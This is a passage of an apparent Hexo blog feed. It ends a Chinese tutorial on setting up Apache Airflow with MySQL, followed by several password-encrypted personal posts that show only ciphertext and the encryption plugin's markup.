class="line-numbers language-none"><code class="language-none">airflow webserver -p 8080执行之后在浏览器输入：localhost:8080&#x2F;admin结果如下所示：<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdn.net/20180828194455231?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="airflow"></p></li></ul><h4 id="安装工作结束"><a href="#安装工作结束" class="headerlink" title="安装工作结束"></a>安装工作结束</h4><h2 id="二、更改数据库为Mysql"><a href="#二、更改数据库为Mysql" class="headerlink" title="二、更改数据库为Mysql"></a>二、更改数据库为Mysql</h2><ul><li><p>1、安装MySQL，方法不限</p><pre class="line-numbers language-none"><code class="language-none">pip install mysql-python<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>2、成功进入MySQL之后</p><pre class="line-numbers language-none"><code class="language-none">新建用户CREATE USER airflow;新建数据库CREATE DATABASE airflow;CREATE DATABASE celery_result_airflow;给权限GRANT all privileges on airflow.* TO &#39;airflow&#39;@&#39;%&#39; IDENTIFIED BY &#39;airflow&#39;;GRANT all privileges on celery_result_airflow.* TO &#39;airflow&#39;@&#39;%&#39; IDENTIFIED BY &#39;airflow&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>3、打开上文提到的airflow.cfg<br>将 sql_alchemy_conn，改为如下：</p><pre class="line-numbers language-none"><code class="language-none">sql_alchemy_conn &#x3D; mysql:&#x2F;&#x2F;airflow:airflow@localhost:3306&#x2F;airflow<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">初始化元数据库airflow initdb重置元数据库airflow resetdb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="三、启动airflow"><a href="#三、启动airflow" class="headerlink" title="三、启动airflow"></a>三、启动airflow</h2><ul><li><p>运行命令（需要在不同窗口）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">airflow webserver <span class="token parameter variable">-p</span> <span class="token number">8080</span>airflow scheduler<span class="token comment">#以非root用户运行</span>airflow worker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>浏览器输入 localhost:8080&#x2F;admin</p></li><li><p>(o゜▽゜)o☆[BINGO!]</p></li></ul><h2 id="四、实际项目中可能遇到的问题"><a href="#四、实际项目中可能遇到的问题" class="headerlink" title="四、实际项目中可能遇到的问题"></a>四、实际项目中可能遇到的问题</h2><ul><li><p>如何打开已有项目</p><pre class="line-numbers language-none"><code class="language-none">在 airflow.cfg文件中将 dags_folder 指向已有项目原本为：dags_folder &#x3D; &#x2F;Users&#x2F;liyuxing&#x2F;airflow&#x2F;dags改为：dags_folder &#x3D; &#x2F;Users&#x2F;liyuxing&#x2F;work&#x2F;mive&#x2F;dags<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>如果需要添加自己的dags，在airflow目录下新建dags文件夹，并将文件放入文件夹即可，airflow会自己找。</p></li><li><p>报错 No module named pyutil.program.conf</p><pre class="line-numbers language-none"><code class="language-none">‘*’号为Python版本cd airflowenv&#x2F;lib&#x2F;python*.*&#x2F;site-packagesvim data.pth在文件中一行，添加pyutil的路径（其他类似问题也可这样解决），如&#x2F;Users&#x2F;liyuxing&#x2F;work&#x2F;util<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>执行 airflow webserver之后提示缺少Redis或者其他包</p><pre class="line-numbers language-none"><code class="language-none">通通pip install 缺啥装啥<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>schedule_interval 参数意义<br><a href="http://airflow.incubator.apache.org/scheduler.html?highlight=schedule_interval#dag-runs">官方文档</a></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Airflow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>书&amp;电影</title>
      <link href="/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/About-%E4%B9%A6&amp;%E7%94%B5%E5%BD%B1/"/>
      <url>/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/About-%E4%B9%A6&amp;%E7%94%B5%E5%BD%B1/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请找作者确认" data-whm="文章校验失败">  <script id="hbeData" type="hbeData" data-hmacdigest="d79bbdd47bc18957b9c87c7c32fe05e2c72f6885966db4f497ce7d7165ceaa26"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-blink">      <input class="hbe hbe-input-field hbe-input-field-blink" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-blink" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-blink" data-content="请输入密码后查看">请输入密码后查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> private100 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云南</title>
      <link href="/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/About-%E4%BA%91%E5%8D%97/"/>
      <url>/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/About-%E4%BA%91%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请找作者确认" data-whm="文章校验失败">  <script id="hbeData" type="hbeData" data-hmacdigest="9f95ee70ecb46791cb3e8f0215ffa3e907f07021609ee6f9cd24589816a5a068"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-blink">      <input class="hbe hbe-input-field hbe-input-field-blink" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-blink" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-blink" data-content="请输入密码后查看">请输入密码后查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> private100 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>十六型人格——INTJ</title>
      <link href="/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/About-%E5%8D%81%E5%85%AD%E5%9E%8B%E4%BA%BA%E6%A0%BC%E4%B9%8B(INTJ)/"/>
      <url>/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/About-%E5%8D%81%E5%85%AD%E5%9E%8B%E4%BA%BA%E6%A0%BC%E4%B9%8B(INTJ)/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请找作者确认" data-whm="文章校验失败">  <script id="hbeData" type="hbeData" data-hmacdigest="a634c024961833e61a69fe7bee763af426f46615c8fbe5f8db805ab7fee598c0"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-blink">      <input class="hbe hbe-input-field hbe-input-field-blink" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-blink" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-blink" data-content="请输入密码后查看">请输入密码后查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> private100 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>宫崎骏</title>
      <link href="/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/About-%E5%AE%AB%E5%B4%8E%E9%AA%8F/"/>
      <url>/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/About-%E5%AE%AB%E5%B4%8E%E9%AA%8F/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请找作者确认" data-whm="文章校验失败">  <script id="hbeData" type="hbeData" data-hmacdigest="071b3045608a251c0aefb15f08c7478adce8dcc58457ad017a21da1dc12680a4">23933bd71f3b356245e911eee53c218a36b1d6f84882891589910180e021c58c6ba2bbf26e7cb3effdfd0090472d15f6b7d2ea9bd43a42b08a556c85b01e4caf865cfae616c23db99a8006dbb6a5719d0e402aaafdd069999fbd95d96407954fb8c8e4b1001d857e24e4f7d027715cf26abd20f5be35544a1cec18916635570891e26a09d385c573d17725e92e5568058d8cb92ac17f4b06c3a1bd32b6f0f2e48c1c515b5080bf0f9c4819dbf406d8e02b74e0a2d1844f97de6c9a775f9a41fbae4d3678b1c3a2f5e496e9fabbbfd700e28af2f0fb567c38840510b52107d96dac52ef5069988ac7d5abab82a6a73efaa2be9096f9e1fe869d618e196821c5f992b934b15751fe5c9f122534197b5990ad453d2900546a8a9da225d2f43aee5202dee6430e474365bfb50c532d9fec7ee9fbfc2632e3fab88079e81704cf78d8d1001c5421c4950c37b294203c162a04bd1532396312bf77b7d563f534ae68e2620d1cc47e3b5511200b85e41a72bac2c337a646ddbc1155afbe9826b3bb68aa71b46f648521c44599c7eb13919eb0ecfd19908ba176af4a0ad2993e8a49be56e56422ab66689c3c45ff7fa38335609eb7753926201b3356349c312efbfb787fc65f300a62c66a98e1ec3ef9cef88c0a26d10a3737322ec27e0ef0afc50cc53bb1601184336c876ea93c5033c3c25a4a2a21b635072026ae751bd2670be935cdd7faf08c7ad1f0e9e028c8a1a630f612feeb45ea0402829270c86d0a9d0c1c977cd8d6366283eecb4de9d59427b3ea2a1e1c7c9bc787239b642e06f7e490a8ba0bb91f0c90a874e1c9d19316b4b1081525f3dfbbb31835d89b5cdda2a69cf9b00064ffc8c00deb27701a2292161b3df6af783874e1067ab728db79b896e112e61dcb88258b129a11830fb33cb120a0ff3cdb0e24b6f085e91d596804c63735a3f5e33eecefda158441382027308b856707adb5de6346d0c34c283ab75009aa28ac9bc0eeb157baf4cc814ff89551c3d22400780dffde4bc4f610df837c765f698885f383eb223b27f3ec96a9106bcbaa36c5a71b3766d52cb4f8d652ddf1b3cbe3d84512413a128b94675c2a2ef50b1f35f101547a08743d01b1e8e376805349547252cf8274b6a5a2db6d7b4ee1dc3f48fc388f22d17c1f8a83a73acf353f0c5161a922356769cbda9db1354ff1ecf3b3f0580a27133d5fdaa320e99d8322f16af2b7d87539bb5314e5a97f4628d7c931c303954c7f3279083667aabca2965e80b5c664cc9c8acb82b2339a8f998eb8c2be56b5e4dd9e869f03b7949dee4d7983b0535bc01d89f4e0d6b457db28c497c4f0d5980a44fc6b5662d44015c173e2148db8610916dbc24904a04ab0442687e41a1a0b744f64deb95b81167775112d721ad88f54d0db9bef3d20579ffaf378432bd82693bc83373b2be40568dc2aff21ef33c61218f4f139a8b41e93d4897d9ba234d98238428b8823c0002e457a9fda9f8485f167c0afa87717916ac4d0661a8f7e7c408f5343e981ca11ab71b67ea8a17e667d672aa78920c576668cb3c990c424e6257d45ee27cfbaa27162e5ddf39e26e5a8af34024bec2c2caac7b1ed8fbf96f550a4d46467b1e61fadf1ccec4dc6728fc490d1cc8a5b4131fa5b23fbc53808c46391c7290c7743b057822e58141bb303e875a05229c5694a28cf8e4b35675ecfa09c2a400d63e79fcf24efe3f67dca55faadff9d81ecb6a81bce9a70b9f9ae5ea455a8a569b1e303329621781ca6af69c8270e54527b90dd208bad9b305b4afe427582e926849e5400153be91d7b63892f2204f22004fc812604d27301a6064645b6e006b87431d458f9cda0f61f892c88dd6d31ab61644d55b522e1847f14e9d9bc8b4f8ba1fd072340045fb45a963dafa62504d1dc99a62b2c3fc9ab0f64edad0d069b32cadde98676ccd9d5824832ab55c701e677f0627f0c62b311067dd7a8289a6b523d10c059971a8056167c73125127c57dbb7a74050331efbf761d9182af0d999e08382dae6a576b3ef7d6e1378650c53cc4b4e3435cb8dc4646aa8dce8e3f3f8e8911bda81da9cda4c4d67192932c301876eab9318498e9d463822e676640b29d779cb6d499c61f296ed2df18037d834a9445a47504ef7a017fc75fe57c492ec29fe226d89fd7b6ab82ced9ef4706e5bf41a16ad28b40b995fc1e213f7f3b63e72acbe24784a97fa84d20fe133029a4cd2896081ce1327d2f306440f4060d1c149ccfcf7d139b06eb93d7c70441a78f96938fd2b4c7dfc506a18a942ceca4a09ff4e1a664da9615228ca2391021df95579b0993abece6521f82ec3c048536b86ce02e64b8124ac48c3f52a587dfc6ba0d604b2080ee9e020cdf0fa23c6924106f0d678699d661676c8f1b89ac92cef15993ba47ba46ce09b2b7731776a01f366b9be171b346834a100f3404887882e40f0f085072a08ed3905beb0897632f0f75f7f823571ca931cf8bb73c1d0012466a7e698edfdf889c80b2bdb75fb3f59b03b9bc7cc07ec5f1e7898461f8a169c0d99eac619975b9822437801dcd73eed81621ee2abaedcbc0670c494252fd1281cd719490c976ea2e3dbb2adc35ff0db495145192d8f52ff0a75d2ccdfff1e502df915f7a204a6a20b5a928444fff331102276117c5d709ac69acfa77b67bc8fe4ad0cd5d4d3f99f364a03f52d85a3ee3d971a882b41738f5ce979e9828aeb80be46289993f3ea43ad0f9354fa50e03c152e01facc64d9fe4820a44eb81caecd06a7d656f588ad6779493d98824ce7d7acdb4ef999ebe1e58c4d7a90dfaf59f4182dc570cb6764b274884136f70af10857532de0cef4670dcc2662de1384fa8ec0146f3bc89edabf5cbb716900d497a6b00a1e2631c74752d00327a93ec8786603ccd3c0983237b78528c1dbdc6e216846294290a73e85cab927e5060db0946261688253c8687a1bd2fb1821d564731eefdac7ccc12b9268ff7a496ef517d722990dddc7c0c754ae50ce8705bd82a32c0639e9e29aaf5f2deeff237330033852516d3b9d4dfe73ff88bb9d3e8c0952d412f8444c5a86bccd3004662d3824253c0c83b3c0cb117b809eb90e3354c875334c9759653e1d8af764a97cef63e1fbd910acff6648833a44e0471c75553b3a6ca2e2a222551f1e3e21e23ac3beba73c60edf8b91db943c2e153436700040018bbc777447f1155954ac518648fc66090a3c6b0730c18d1513f77bbbb7b2de0d5142462944919c896df2dc4f92b81854f2948314ccc100bc0ca723bfc28507a4b0ace9c5698713794b1ddac1788813d4e3691fe3ccc0d1fad71de51e2c1b99f05996c5a550bdad0a9cdd258d5bd85fe587dd0782f5c813afa518e0a2c0f0ee69c346af55fa50b38df6e427ff9a0a9ccdc3580e06362ce1b750afd73d98d292aae59859b3ba704d2de94b703aafb2d305f67d937c11d5916383c06c59db720d96c23d2c28d2f433efc2f84ae11a09139c165adeb5c0ff65c7816c154ee5c13fa4ab8f1ad3987b695788f8ad81333ea6266ec67dcc5307f0f3dd41cd00febb03e6fcfb2b2c1899bc82981c35363c9b139fe4b98ca6d25116bfb451227551123e17998c444203899a200b49ce1b3ed90aee41ef9d3848d9cb5769625274d7c7f95aa11dee25a4f8eac472b4727b3e12e8103fdc360da771a10a706987700d5e2525e94081287a4ed6c50d9424c87b3bbdb45ecb9b5ae1e293547c97ce449afe50e8bd85936533838744d0db7816a77fbc0cc9d61cfe050c52d1c6310225bedce045c84af9863f5a0829333dd1454b07ea0fbbcb745c08370ed17b39a511ac099182c1d849770661402d0fbe44972b9b06086d1313ff444a96699a707a7d465263611510deac5bf80f109ed41b044e7531bb66d69ca9ba26c60894500aeb1c222137a5d9e62b78312288ac7f6447928a581dd9af8d43921587676cc7ec7e1618dc3d5a13e7f1938db23bd321aafa6cdc710ef90d9f50f229ee7695d0def02e169b9ae465629cd897b2c1eaa6fc440e02015d200ba1f861e208a1520b1960cd8664555f90ba5e16bfaca2b5b654cf3c9b60eda58384d95304e1b65e66cdb7172c36bd26e49c3817c029150a630ddce713c535008b62bdb02e3e5fbc6cf71a311bfaef1f692f86a41a5eb8d215574d0f31bfdeb1dc54e61aa320a5bd191e6c54eca86cef55f154a91b9e1fa15c593bbfad1f4a2c48837257393d67399824c1d61a0b5b3835b990af1c47a7bb3feef671f82850f8308240a0f3b723b135ad06a1dbb2d55fa26b219f466067eeca46d9335cd9d6f83e8483b19a7ef0c75625b55751bf953d9988adec021cb5a8d1a689d3bd8452adba87de851284bec0a9f3dc487c9c67a6d8ef55fa63bced2bc1d103638228f0ab3f7fd290d86b4806ccda6adcc2110137d207ec86c8e246898b01a3706329ef78d604d24ee520b6470036834ca7dcb532d65e40cc81110f29aa68b352821cf37be426ef5002d7dee0d5ee698dbef9b03f23490f6f7dfbc791fcc15b099561dda2adaa45bc1d9df0162ec0c8ca1b21a35a991ee2e3990b80998dca5132019440155dce08b60df488576aedafa5c5af1320d723e6f930b5255162d1ddb2d202b2d43f03fa05a3c030ff37d6d047298cd6983ff41ad9147bafa07c2f656a53c88a41377abfba1d18fa4ed43948c52785b7567648972ef437a5aeef9c6d51fa0fb07878d4beb45d71ea241a2ccab3062a6482702ffabbdce57406c9f21691e99ea67f8dd0a038b5606b3278847ad5b03f2b8cf6bcf1cc30ef67d756723733b1daa6961da5f27a040bcdd5b95db5099011478a0edf59336e19ce1b773d0302a8644e5499aca9ae2ac13d27241ea812c01e3e1f9b2efc1681b5e539f53df8d2d192dce88adbfc2dd29e83e3d658a0af0181f7233c72faea89d49f566c3638f79342f0eb7e6c014028af1bf3ee985912c53b50634f5e1be67d968b5d7044020c11e825fd1d0d9baf95aefa74884fee07bb624dd6af666b40fdb1f794c7bd5fb68ce73974177fd2edd97eb324ff6374f4f9c92e20a5201192bf242b7fa6af1e5dc7506c96974f055ee3b0e7c140167f3a5e25f3879aa9a0ff071f322153a8bab363d9623eac8351484a0c1d80f</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-blink">      <input class="hbe hbe-input-field hbe-input-field-blink" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-blink" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-blink" data-content="请输入密码后查看">请输入密码后查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> private100 </tag>
            
            <tag> 电影 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程序员-35岁危机</title>
      <link href="/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/About-%E7%A8%8B%E5%BA%8F%E5%91%98-35%E5%B2%81%E5%8D%B1%E6%9C%BA/"/>
      <url>/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/About-%E7%A8%8B%E5%BA%8F%E5%91%98-35%E5%B2%81%E5%8D%B1%E6%9C%BA/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请找作者确认" data-whm="文章校验失败">  <script id="hbeData" type="hbeData" data-hmacdigest="9108b0bf990ded74f31e345554f6ad0f7dfcf133581104bcc2c6c6078ef42154"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-blink">      <input class="hbe hbe-input-field hbe-input-field-blink" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-blink" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-blink" data-content="请输入密码后查看">请输入密码后查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> private100 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>心理学</title>
      <link href="/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/About-%E5%BF%83%E7%90%86%E5%AD%A6/"/>
      <url>/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/About-%E5%BF%83%E7%90%86%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请找作者确认" data-whm="文章校验失败">  <script id="hbeData" type="hbeData" data-hmacdigest="7f0c12264906f1a58e6c8ad93e80b383e17ad6baf280b013fc3929ec727e7363">23933bd71f3b356245e911eee53c218a9dcd1f1236f04795aa49339fe8e95e1c279ba5398fd745535a66776e0f42316c659a6d136c92f8ff50958a95a1a33965d8cd9338835e5d5d78cfa348bce938b00e9339dbec3949889f460ef76e46efc18f36d2c0531dcbbb1bea2583d4cdd00db1740a7af2be56d8802e440f4e93be9c7ad974d3dda74ed9f8bebcf95e3cfd98212fc25a0b1619bfc029a858798ebe201fb6eb130aacfe22908498921704ce22a2bed9f71dd3309abf67829b9a453df6845e21537bb17791d3ee2ed202672af1a4200b46865a941079d8b0b4482bce14085ce44ccc23cfcb57d6d2a63dc91a4cc385e6deff768aab769833160eebbf543ffc58a26015ce5a090dbb800974785e961b75aebf662ab8173c0817722f0f068196f552a771a4e12a87f5ba6522d8cf2b47fcf1f341b49ea5cfb0c49644283c5376497a54f2138653617f9d044706b8dec47518749d6710d0888d2e5f536afa93a57064825eef976c4f1eaf7895ff6d22d7d46285afeaaf28283756467545771e736dbc897e896ab71f24035e4b6e950792c365fd868878bf8ee739e0ba091f9962494db6b798b5673a247a54d2d8e919ea52af1199f4206cc0c2a9e334adf9c67493c894730e3f88c71a51377a42211526e68af366459deb56b56b05ef538522d5e5aaf64300bd042f27d91465b02a392b3619b0b4f36f37cc179693881bf9f61e832b3e088d74a28befebec71f77e8b57903d17c245cdea0392e227ebe08d2ac8366f6cd476e2c2682c0caece172a0617c19d5437f0f6a663642d3d8981215e65e98a9b718158c43321e78ff67364686c0d53cfbef2bdf57e61470d3619b20f52151722653fcc7cb1e86565b92726651b8fd5a5b555663ccbb7d020e2bb459c2e4e6bdee8b6015f2469bc3c8d76c04b7903f675e603bedbbcd5b9d93d69315cc80775de443e20017338cf15b6446583323959dc69a7372368dbbd2c1bdd50e359a189b8720f2458afc5194fac8bcd51e5fd1d9e618c292394b12c67e90fb68f92f2393f15a9177c802bd9173a5d8ff704494a6380761ed6313972b588941842bd66dc1a927011232dd826a76c509067577a8f92f6c879fdca323cbfb5a9f1099c26f6962a6c6eb1a591864fe294a21268afc1591931b642c9e83c327a83b220ffb7f6ae3ee0c944ed0445ab13fa642359bbd256f895da496a744b069588af215234d9e502824eab57335afad650cd74d157f1a6fba46b689f78105bfd25969485d3676e73dbc34fa065d4a1fb7daf18607641f11a9af1925dfffaa07ea4ba7d40983bfc8fdbc1cd5bcacd07657558f08e7b10a4e0aa3380dac6715672149bc9cba76032d03a16c2bb0781e380ec033bbb7471cbd74c7416d39c0be9fc525918a2c6fcaaf28d0a57b29687706f253a0cb177074f9965156f94128fa38d4716941548e6f01bb64b9bd40ccfc2543e1423df5110bb747c3b9d66fb012ece209d8196e3665f6e6327155ba38e7ea190d09180f02ab57c943b22c7d124fe940c9cc466eeac747baa3d064fd340ae3192b6557c2c49af7a602f38920e2591681a0fbbfe92d9c5eda4e060ac2f7747475c42ea4b817e36c816bc61ccb18d2f8ad673f9acf2cebd3df6658f1362eb718c4910</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-blink">      <input class="hbe hbe-input-field hbe-input-field-blink" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-blink" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-blink" data-content="请输入密码后查看">请输入密码后查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> private100 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程序员-印象</title>
      <link href="/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/About-%E7%A8%8B%E5%BA%8F%E5%91%98-%E5%8D%B0%E8%B1%A1/"/>
      <url>/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/About-%E7%A8%8B%E5%BA%8F%E5%91%98-%E5%8D%B0%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请找作者确认" data-whm="文章校验失败">  <script id="hbeData" type="hbeData" data-hmacdigest="191e969c7e8f62605f2593004a4fb1f6f9ab72db9fb9d84db7ae33d9acbc5827">23933bd71f3b356245e911eee53c218a36b1d6f84882891589910180e021c58cc0a1b4602eba0b07fc3c7c207f6ea3d4c24954d09627c3ad6bd281bb46b328f2d88c26359f4fa87ee46b84e6d59a39c4318a2811e75290acb85a2f21bb73a9adb4f01f7321359800010487f78cedd916611987af04b49ad460acc0085165c9e9e1ff12b689ffdb4f73b1465ac745d33eef1017397abb950facc311fa75de5ab3e078c362356a88c76b7e0e2e601e4bfa7c919c3eed24ad4d6037a10adbb13b521814292562829b8d3ce15855658330892f37a32c58ba4510e490fcdd6355f2771c0217f9797306fe493aff8be1c7b6657b3ade841fe255cc0a6a5ef7d45435efba7bd7c124bd78e9e5472b3cefd92f9f4166bdbc4548ccaf2f8b3efb8fb4dd61197a4d41b6724272faa920ffc029b86ec5d00da6da7cb9180e7b22576da7acd6d92b1bfc2de89d7bc12ac0b6910121e58ed11e1126d37d8d7a93b7576a762aa4fbfe30be9dec0933210b9ea6a3c0e5d6407472f1986c623c124615f6db6cf24928331bc1d174356027ba94c959cd08a734ee88562acb98d486d7a0d365e965c9585ef4136c431fd0a241f7a6dba567b3876aefc9ee6f20428d2884821c85aa11616e9f57c36de0c5168d52633843500e82818a5bc6c9d79fcf15f629ecb3486c56e90b96abe9250c661a2c42ff7e94ccd6da8806ef2112ad0d68ca3feae7dd90745465005e62ddb4388c412fea38d481e336d7f7499f139c70e2ef9e7459f0b43691058e83c3159a7e4fb0016bd0605cdfbd15fc31958261f49fc3bdc09cbcadc3295d87eb0c7772c792c9796d015b4ae9b2152e8b28de55f7eb973635cb372a540ad8952849ae44cded245c774d24867f015647afda20d7b59e9d6c58e1282181508b014bb913253882ca276e5b6b9375c7b8757c4b91b5e4d4ac7ce16214e9dbae8e6656d022e113540d19232938a4a253410d824b62161e4638c1012359291c8bbb62c8c6ead873caa3094ef69678bac70fcdb8630ce080322ae3eee15114e4bf4d50cdc27296c919ca5cc337cc11773c4d79e821194cda846e8d8a851e91a2e117f794522a4d6bba4a97d7e856ecc6dc5210160a3c94cadd6889694e9458ccf66cc0459d48322da8c7882b861363a69483452a7c41ecdd27a7d2754a01135402a2718cc29258df89d54e2dc470827f295ecc8d195113de775edb79069f853ecb421d4aea0958e156a44c202804b5a7e1f26166bec0513baec3fdb76d0dcd10354b3f0ed40ff40006380037666f97c6b4db7f273451905cc62e94b42db990c4237ce1486425727492f98ed8b4f8ebf119c25ba8e8687dc4b11575d609ecad70e235f67d596b6734da62232ff079ddf4912f94063e548149922d0f0737129fa96c4e09fc164f688adae731020902ef2e47fea5912dd079ad9292daad4d10d37705a9cde2483e61bfc30defbcdd62cd3aa1de754b52ac770a5643634df02f8de5f6f0121002d83d494c4aa54e27c9839fbf4d4dae5947b45b910218cca5818fcb39d18e4e525d35688024efd774f81ef606b8e257afdae0b89fb9811de4d4422b755f70d3e06ffe2e1802e58adcc496843a677ec867b74a097b1b034bec9e1514d2b3ad8e6ee96f5bda38fc6ae16f3386adb05ee2252742896fb7a5c71fe7603e0b3fef9eeaf23e4e047b897ad097dd4d4081ee0d541a586d52161bebed15c11ed884baa744a020b711664363250eccf99f7adb9ae00a916275b7150f08b37076dbf5df7809885366b257c3e4b9e09e2e05b0f1ff91894599d3dd6c3010f4d30095451aed342af4dca5c0821c90608eb6866663011fee22a74424a52734f537af2b626ac86c6b8f5f3ced3f2c7f5c0c174a7c6372e7309f0cecf3ac1a64446c79914c3b291b07771422206eba2be1659b01b10c886a653a30f6194a6fde33705a93a175ba286fefdb621a81af3ee835150b6db3c9a9a516bfa899862b68512939c7046fdad3900a2bbb1e24d18e9da6552099307760b2a2a1710de7b8024407dfbf534026e2ffc4d8e50a8248df0e545fce070fd0c3d542489816c22b38febe7f985558d439887c09833f5605327b0f4fb4bc802b9f3f327813af3d558f3c9b52135b0265d922298755674ddf0ebca60debe5e1d237d1ea26a919a24acc4f0d7141fa156e13c39d490ef063e85ad5325a4499193931b3c5d0c688d89ba477821609382f9cd9aadba53453e5ffe2d4c1a1d25a2180c98483d9c67bfb6cca3b3d7870e8ebe7bda3587e3c31a420c558b110fd18e599a81dbde2f54d94403a639a36b31648e7fee2bbbdfc3dbe798ebd3de8039f5f71cde9f36fd1fddfca5db0d77dd6cfb53a24a03bfdf619b088a976cb3e987e609dc7d13072a3590c5c489ea5e36822a22e865eb4c71553458e09ec8e94c99b489ba6b6fc8c89b1ab6c373e2772e2763fc9d62fb102cba47456cb5b25abb888bb91601fc5970716d2e0d8017196f32a0575206fa607d15db3d915791369197f0d85c31042eeb254dfed5b2fdc48282485a0ce2396842363685b731eb702db5eb2b62cceb0449b807225f36aa6b1bef9f489699d3c2622702287ca1c0c34949ba1336a0ce2ceb32e4eaf8135e8e52f33533e5bd780327300708d623559defa15571ba7e291592cb49ba0224bcfde61cdbedc96b29c8050363938df142907c604f66fb21e4d527ffc883bfe8a42dd2f1597625cd6abdead2b28e37ee00ae5ca0a895d5ca42d67807e4b55bfe879d67e69afad8b8473cc96551b2b03ea41d62fb2142